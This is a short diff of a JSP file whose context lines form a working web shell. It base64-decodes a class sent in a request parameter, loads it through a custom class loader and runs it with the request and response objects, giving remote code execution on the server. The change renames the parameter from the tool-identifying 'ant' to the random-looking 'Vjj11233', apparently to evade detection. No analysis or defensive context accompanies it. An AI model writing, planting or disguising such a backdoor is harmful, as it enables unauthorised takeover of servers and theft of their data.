@@ -26,7 +26,7 @@
     }
 %>
 <%
-    String cls = request.getParameter("ant");
+    String cls = request.getParameter("Vjj11233");
     if (cls != null) {
         new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
     }
